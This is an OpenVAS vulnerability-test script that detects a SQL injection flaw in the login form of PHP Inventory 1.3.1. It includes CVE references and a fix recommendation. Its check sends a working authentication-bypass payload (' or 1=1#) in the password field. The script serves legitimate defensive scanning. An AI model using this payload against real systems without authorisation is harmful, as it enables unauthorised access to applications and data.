###############################################################################
# OpenVAS Vulnerability Test
#
# PHP Inventory 'user' and 'pass' Parameters SQL Injection Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (C) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802534");
  script_version("2020-08-24T15:18:35+0000");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2009-4595", "CVE-2009-4596", "CVE-2009-4597");
  script_tag(name:"last_modification", value:"2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)");
  script_tag(name:"creation_date", value:"2011-12-05 15:37:27 +0530 (Mon, 05 Dec 2011)");
  script_name("PHP Inventory 'user' and 'pass' Parameters SQL Injection Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2011/Dec/0");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/520692");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/107425/INFOSERVE-ADV2011-08.txt");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to include arbitrary
  HTML or web scripts in the scope of the browser and allows to obtain and manipulate sensitive information.");

  script_tag(name:"affected", value:"PHP Inventory version 1.3.1 and prior");

  script_tag(name:"insight", value:"The flaw is due to an input passed the to 'user' and 'pass' form field
  in 'index.php' is not properly sanitised before being used in an SQL query.");

  script_tag(name:"solution", value:"Upgrade to PHP Inventory version 1.3.2 or later");

  script_tag(name:"summary", value:"This host is running PHP inventory and is prone to SQL injection
  vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod", value:"50"); # Vuln check below is quite unreliable
  script_xref(name:"URL", value:"http://www.phpwares.com/content/php-inventory");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port( default:80 );

if( ! http_can_host_php( port:port ) ) exit( 0 );

host = http_host_name( port:port );

foreach dir( make_list_unique( "/", "/php-inventory", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = dir + "/index.php";

  variables = string("user=admin&pass=%27+or+1%3D1%23");

  req = string( "POST ", url, " HTTP/1.1\r\n",
                "Host: ", host, "\r\n",
                "Content-Type: application/x-www-form-urlencoded\r\n",
                "Content-Length: ", strlen(variables),
                "\r\n\r\n", variables );
  res = http_keepalive_send_recv( port:port, data:req );

  if( egrep( pattern:"^HTTP/.* 302 Found", string:res ) && "Location: index.php" >< res ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
